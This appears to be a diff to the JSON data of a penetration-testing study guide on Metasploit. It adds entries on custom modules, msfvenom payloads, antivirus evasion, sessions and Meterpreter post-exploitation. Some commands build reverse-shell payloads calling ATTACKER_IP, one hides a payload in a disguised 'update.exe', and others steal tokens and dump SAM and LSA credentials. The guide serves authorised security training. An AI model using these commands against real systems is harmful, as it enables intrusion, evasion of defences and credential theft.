@@ -101,8 +101,19 @@
         {
           "id": "custom-modules",
           "label": "Importing custom modules",
-          "detail": "A module not in the framework (from Exploit-DB or written yourself) goes under ~/.msf4/modules in the matching folder structure; reload so msfconsole finds it.",
-          "cmd": ["mkdir -p ~/.msf4/modules/exploits/custom", "cp module.rb ~/.msf4/modules/exploits/custom/", "msf6 > reload_all"]
+          "detail": "A module not in the official release goes in by hand. Find Metasploit-format exploits on Exploit-DB (filter by the Metasploit Framework tag) or with searchsploit; the .rb files marked (Metasploit) are the ones msfconsole can run, so not every .rb qualifies. Drop it under ~/.msf4/modules (or /usr/share/metasploit-framework/modules) in the matching folder structure, making the folders if they are missing. Name it snake_case with underscores, not dashes, or it errors. Then reload_all, or loadpath <dir>, and search or use it.",
+          "cmd": ["searchsploit -t nagios3 --exclude=\".py\"", "cp 9861.rb ~/.msf4/modules/exploits/unix/webapp/nagios3_command_injection.rb", "msf6 > reload_all", "msf6 > use exploit/unix/webapp/nagios3_command_injection"]
+        },
+        {
+          "id": "porting",
+          "label": "Porting & writing modules",
+          "detail": "To turn a Python or PHP exploit into a module, or write one from scratch, you work in Ruby (hard tabs). Do not start blank: copy an existing module from the same category and reuse it as boilerplate. The include lines at the top are mixins, shared classes such as Msf::Exploit::Remote::HttpClient that hand you ready methods; pick the ones your exploit needs from the Metasploit documentation. The initialize block holds the name, description, author, references (CVE), platform, arch and targets; register_options declares what the user sets, like RHOSTS and TARGETURI. Keep custom modules tidy so you and the next tester can find them."
+        },
+        {
+          "id": "plugins",
+          "label": "Plugins",
+          "detail": "Plugins pull an outside tool into msfconsole so its work lands in the same database and you stop juggling separate software. Nessus, Nexpose, Nmap, Mimikatz and others ship ready to load. load <name> starts one and adds its commands to the console. The .rb files live in /usr/share/metasploit-framework/plugins, so a custom plugin just drops in there. Mixins are the Ruby side of the same idea, shared code the framework is built from. Worth knowing the name, nothing to set.",
+          "cmd": ["msf6 > load nessus", "msf6 > nessus_help", "sudo cp pentest.rb /usr/share/metasploit-framework/plugins/", "msf6 > load pentest"]
         }
       ],
       "next": { "label": "Proceed to Exploitation", "to": "exploitation" }
@@ -144,7 +155,9 @@
                 { "id": "pl-bind", "label": "Shell binds", "detail": "The target opens a listening port and you connect in. Needs that port reachable from you, so it fails behind inbound filtering; reverse shells are usually preferred." },
                 { "id": "pl-reverse", "label": "Reverse shells", "detail": "The target dials back to your listener (LHOST/LPORT). It rides outbound traffic, which firewalls trust more than inbound, so it works through most NAT and filtering. Still watched, so tread carefully." },
                 { "id": "pl-exe", "label": "EXE", "detail": "A payload packaged as an executable, built with msfvenom and caught with exploit/multi/handler. Beyond Metasploit's own payloads, frameworks like Empire and Cobalt Strike cover the same ground on real engagements." },
-                { "id": "pl-encoders", "label": "Encoders", "detail": "Rework a payload's bytes to make it compatible: fit a processor architecture (x86, x64, sparc, ppc, mips) and strip bad characters, such as the null byte, that would break the exploit. show encoders inside a module lists only the ones that fit the current payload. x86/shikata_ga_nai (a polymorphic XOR scheme) was once the go-to for evasion, but modern detection has caught up: encoding alone, even over many -i iterations, rarely gets a payload past antivirus now, so treat encoders as a compatibility tool, not an evasion one. Before 2015 this was msfpayload | msfencode; both are folded into msfvenom. Check a build with msf-virustotal (needs a VirusTotal API key).", "cmd": ["msf6 exploit(...) > show encoders", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -b \"\\x00\" -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe", "msf-virustotal -k <API key> -f payload.exe"] }
+                { "id": "pl-msfvenom", "label": "msfvenom (standalone payloads)", "detail": "msfvenom builds a payload as a standalone file, outside an exploit, for when you deliver it yourself: an upload, a writable share, a phishing lure. It is msfpayload and msfencode in one. Pick the payload with -p, the output format with -f (exe, aspx, elf, raw, or a scripting language), set LHOST and LPORT, and write it with -o. Catch the callback with exploit/multi/handler set to the same payload, LHOST and LPORT.", "cmd": ["msfvenom -l payloads", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f aspx -o shell.aspx", "msf6 > use exploit/multi/handler", "msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp", "msf6 exploit(multi/handler) > run"] },
+                { "id": "pl-encoders", "label": "Encoders", "detail": "Rework a payload's bytes to make it compatible: fit a processor architecture (x86, x64, sparc, ppc, mips) and strip bad characters, such as the null byte, that would break the exploit. show encoders inside a module lists only the ones that fit the current payload. x86/shikata_ga_nai (a polymorphic XOR scheme) was once the go-to for evasion, but modern detection has caught up: encoding alone, even over many -i iterations, rarely gets a payload past antivirus now, so treat encoders as a compatibility tool, not an evasion one. Before 2015 this was msfpayload | msfencode; both are folded into msfvenom. Check a build with msf-virustotal (needs a VirusTotal API key).", "cmd": ["msf6 exploit(...) > show encoders", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -b \"\\x00\" -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe", "msf-virustotal -k <API key> -f payload.exe"] },
+                { "id": "pl-evasion", "label": "AV & IDS/IPS evasion", "detail": "Defences split in two: endpoint protection (antivirus on the host) and perimeter protection (firewall, IDS/IPS at the network edge, often with a DMZ between inside and outside). Signature detection matches known byte patterns; heuristic and behavioural detection flag anything that strays from normal, so a plain payload, or even the callback itself, can trip an alarm. msfconsole v6 tunnels Meterpreter over AES, which handles most network inspection, but the file still sits on disk before it runs and can be fingerprinted there, so encoding alone will not hide it. Stronger moves: embed the payload in a real executable with a template (-x) and run it in a separate thread (-k) so the host program still opens normally, or wrap the file in a password-protected archive the scanner cannot read (it may still flag the archive as unscannable). Packers (UPX, Themida and others) compress and reshape the executable for another layer. For exploit code, randomise buffers and avoid obvious NOP sleds, which IDS/IPS watch for. Authorised testing only, and test in a lab first: you may get one attempt on the client.", "cmd": ["msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=8080 -x template.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o update.exe"] }
               ]
             },
             {
@@ -164,8 +177,14 @@
         {
           "id": "msf-run",
           "label": "Run",
-          "detail": "check first where the module supports it, then fire. run reports the handler starting, confirms the target is vulnerable, and opens a session on success; drop to shell from a Meterpreter session. run -j runs it as a background job. A failed exploit disproves the Metasploit module, not the vulnerability: many need tuning to the target, so the framework supports your manual skills, it does not replace them.",
+          "detail": "check first where the module supports it, then fire. run reports the handler starting, confirms the target is vulnerable, and opens a session when it works. Drop to a shell from a Meterpreter session, or use run -j to run it as a background job. A failed exploit means the module did not work, not that the vulnerability is gone. Many need tuning to the target, so treat the framework as a tool that backs up your manual skills, not one that replaces them.",
           "cmd": ["msf6 exploit(windows/smb/ms17_010_psexec) > check", "msf6 exploit(windows/smb/ms17_010_psexec) > run", "[*] Command shell session 1 opened", "C:\\Windows\\system32> whoami", "nt authority\\system"]
+        },
+        {
+          "id": "sessions-jobs",
+          "label": "Sessions & jobs",
+          "detail": "A session is your control channel to one compromised host, and msfconsole holds several at once. Background the current one with background (or Ctrl+Z) and the connection stays up while you load another module, then sessions -i <no.> drops you back in. Point a post or local module at a backgrounded session with set SESSION <no.>. A job is a module running in the background, such as a handler holding a port. exploit -j starts one, jobs -l lists them, and kill <no.> or jobs -K frees the port without tearing down your sessions.",
+          "cmd": ["meterpreter > background", "msf6 > sessions -l", "msf6 > sessions -i 1", "msf6 > exploit -j", "msf6 > jobs -l", "msf6 > kill 0"]
         }
       ]
     },
@@ -190,6 +209,19 @@
       "name": "Post-exploitation",
       "blurb": "Use the access you have: reach further, gather what the engagement asks for, and leave nothing behind.",
       "nodes": [
+        {
+          "id": "meterpreter",
+          "label": "Meterpreter",
+          "detail": "Meterpreter is the post-exploitation shell you get from a Meterpreter payload. It lives in memory, writes nothing to disk, injects into a process that is already running rather than starting its own, and talks back over AES, so it leaves little for forensics to find. It works like a normal shell with extra built-in commands, grouped under help (core, filesystem, networking, system, user interface, webcam, privilege). From one session you can enumerate the host, move process, escalate, dump credentials and pivot without reaching for another tool.",
+          "cmd": ["meterpreter > help", "meterpreter > getuid", "meterpreter > sysinfo"],
+          "children": [
+            { "id": "mtr-recon", "label": "Look around", "detail": "Find out who you are and what is running before you act. getuid is who the session runs as, sysinfo is the OS and domain, ps is the process list with each one's user and architecture.", "cmd": ["meterpreter > getuid", "meterpreter > sysinfo", "meterpreter > ps"] },
+            { "id": "mtr-migrate", "label": "Move process & steal tokens", "detail": "migrate moves the session into another, more stable process, which also shifts the user you run as. On Windows, steal_token <pid> takes the access token of a process owned by a more privileged user, so getuid then shows that account.", "cmd": ["meterpreter > ps", "meterpreter > migrate <pid>", "meterpreter > steal_token <pid>"] },
+            { "id": "mtr-escalate", "label": "Escalate", "detail": "getsystem tries the built-in routes to SYSTEM. If it fails, background the session and run the local exploit suggester to map the host to local exploits, then run one against the SESSION.", "cmd": ["meterpreter > getsystem", "meterpreter > run post/multi/recon/local_exploit_suggester"] },
+            { "id": "mtr-creds", "label": "Dump credentials", "detail": "As SYSTEM, pull the hashes. hashdump reads the local SAM; load kiwi brings in Mimikatz; lsa_dump_sam and lsa_dump_secrets pull the SAM and the LSA secrets (service accounts, cached logins). Feed what you get to cracking or pass-the-hash.", "cmd": ["meterpreter > hashdump", "meterpreter > load kiwi", "meterpreter > lsa_dump_sam", "meterpreter > lsa_dump_secrets"] },
+            { "id": "mtr-shell", "label": "Drop to a shell", "detail": "shell opens a native cmd.exe or /bin/sh on the host, at the same privilege as the session. background (or bg) keeps the session alive and returns you to msfconsole.", "cmd": ["meterpreter > shell", "meterpreter > background"] }
+          ]
+        },
         { "id": "post-pivot", "label": "Pivoting to other systems", "detail": "Route traffic through the session to networks only the compromised host can reach.", "cmd": ["meterpreter > run autoroute -s 172.16.5.0/24"] },
         { "id": "post-creds", "label": "Credential gathering", "detail": "Collect credentials for lateral movement. Record where each one came from." },
         { "id": "post-exfil", "label": "Data exfiltration", "detail": "Show impact by retrieving the data the scope names, and only that." },
